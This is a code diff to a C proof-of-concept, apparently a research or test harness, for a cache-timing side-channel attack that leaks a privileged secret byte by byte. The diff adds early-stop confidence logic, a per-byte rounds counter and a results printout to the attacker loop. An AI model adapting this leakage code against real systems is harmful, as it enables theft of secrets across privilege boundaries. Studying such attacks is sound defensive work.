@@ -18,6 +18,18 @@
 #define ATTACK_SAME_ROUNDS 2
 #endif
 
+#ifndef EARLY_STOP
+#define EARLY_STOP 1
+#endif
+
+#ifndef EARLY_STOP_MIN_SCORE
+#define EARLY_STOP_MIN_SCORE 3
+#endif
+
+#ifndef EARLY_STOP_GAP
+#define EARLY_STOP_GAP 2
+#endif
+
 #ifndef SECRET_SZ
 #define SECRET_SZ 3
 #endif
@@ -138,6 +150,7 @@ static uintptr_t saved_m_sp;
 
 static uint8_t U_DATA leaked_idx[SECRET_SZ][2];
 static uint64_t U_DATA leaked_score[SECRET_SZ][2];
+static uint64_t U_DATA rounds_used[SECRET_SZ];
 static uint64_t U_DATA active_threshold;
 static volatile uint64_t U_DATA direct_secret_fault_expected;
 static volatile uint64_t U_DATA direct_secret_fault_seen;
@@ -259,6 +272,9 @@ static void install_priv_page_table(void)
   if (map_identity_range((uintptr_t)leaked_score, (uintptr_t)leaked_score + sizeof(leaked_score),
                          VPTE_R | VPTE_W | VPTE_U) != 0)
     panic("map leaked_score failed");
+  if (map_identity_range((uintptr_t)rounds_used, (uintptr_t)rounds_used + sizeof(rounds_used),
+                         VPTE_R | VPTE_W | VPTE_U) != 0)
+    panic("map rounds_used failed");
   if (map_identity_range((uintptr_t)&active_threshold,
                          (uintptr_t)&direct_secret_read_value + sizeof(direct_secret_read_value),
                          VPTE_R | VPTE_W | VPTE_U) != 0)
@@ -318,6 +334,17 @@ static U_TEXT void top_two_idx(uint64_t *in, uint64_t count,
       out_idx[1] = i;
     }
   }
+}
+
+static U_TEXT int enough_confidence(uint64_t *results)
+{
+  uint8_t idx[2];
+  uint64_t score[2];
+
+  top_two_idx(results, PROBE_ENTRIES, idx, score);
+  (void)idx;
+  return score[0] >= EARLY_STOP_MIN_SCORE &&
+         score[0] >= score[1] + EARLY_STOP_GAP;
 }
 
 static U_TEXT uint64_t u_probe_time(volatile uint8_t *addr)
@@ -585,6 +612,12 @@ static U_TEXT int attacker_run(void)
         if (elapsed < active_threshold)
           results[mixed_i]++;
       }
+
+      rounds_used[len] = atk_round + 1;
+#if EARLY_STOP
+      if (enough_confidence(results))
+        break;
+#endif
     }
 
     top_two_idx(results, PROBE_ENTRIES, leaked_idx[len], leaked_score[len]);
@@ -742,6 +775,8 @@ int main(void)
            expected, expected,
            (guess >= 32 && guess < 127) ? guess : '?', guess, leaked_score[i][0],
            (second >= 32 && second < 127) ? second : '?', second, leaked_score[i][1]);
+    printf("[v1-priv] byte %lu rounds=%lu early_stop=%d min_score=%d gap=%d\n",
+           i, rounds_used[i], EARLY_STOP, EARLY_STOP_MIN_SCORE, EARLY_STOP_GAP);
     if (guess != expected && second != expected)
       leak_ok = 0;
   }
